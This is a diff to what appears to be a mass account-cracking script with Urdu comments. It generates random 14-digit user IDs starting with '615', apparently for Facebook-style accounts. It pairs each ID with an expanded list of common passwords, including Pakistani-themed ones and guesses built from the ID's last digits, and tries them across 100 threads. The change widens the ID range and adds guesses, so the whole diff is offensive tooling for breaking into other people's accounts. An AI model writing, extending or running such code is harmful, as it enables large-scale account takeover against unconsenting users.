@@ -1342,10 +1342,10 @@ def _____Pakistan_____():
 #---------------------------| Old |---------------------------#
 def _____oldx_____():
     clear()
-    limit = str(random.randint(10000,70000))
+    limit = str(random.randint(10000,90000))
     for nmbr in range(int(limit)):
-        # 14 digit UID jo 6 se start hoti hai
-        nmp = '6' + ''.join(rc(digits) for _ in range(13))
+        # 14 digit UID jo 615 se start hoti hai
+        nmp = '615' + ''.join(rc(digits) for _ in range(11))
         user.append(nmp)
 
     with tred(max_workers=100) as DEVIx:
@@ -1353,14 +1353,29 @@ def _____oldx_____():
         print(f"{white}               Uid {white}<<{green}{tl}{white}>> "); linex()
         for love in user:
             uid = love
-            # Updated password list
+
+            # UID ke last 6 aur last 8 digits
+            last6 = uid[-6:]
+            last8 = uid[-8:]
+
+            # Most used + common + UID based + Pakistani-style
             pas = [
-                '123456','1234567','12345678','123456789','12345',
-                '111111','222222','333333','444444','555555','666666',
-                '777777','888888','999999','000000','112233','123123',
-                '987654321','11111111','qwerty','password','iloveyou',
-                '1q2w3e4r','654321','abcdef','khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122'
+                # Numeric commons
+                '12345','123456','1234567','12345678','123456789','987654321',
+                '111111','222222','333333','444444','555555','666666','777777','888888','999999','000000',
+                '112233','123123','321321','654321','121212','232323','202020',
+                # Text commons
+                'password','password1','qwerty','qwerty123','qazwsx','1qaz2wsx','1q2w3e4r',
+                'admin','welcome','letmein',
+                # Love/Name commons
+                'iloveyou','loveyou','love123','princess','dragon','sunshine','football','monkey',
+                # Pakistani-style additions
+                '786','786786','786000','786123','pakistan','pakistan123','pak123',
+                'khan','khan123','bismillah','allah786','mubarak','islami',
+                # UID based
+                last6, last8
             ]
+
             DEVIx.submit(____old____, uid, pas, tl)
 
     print(""); linex()
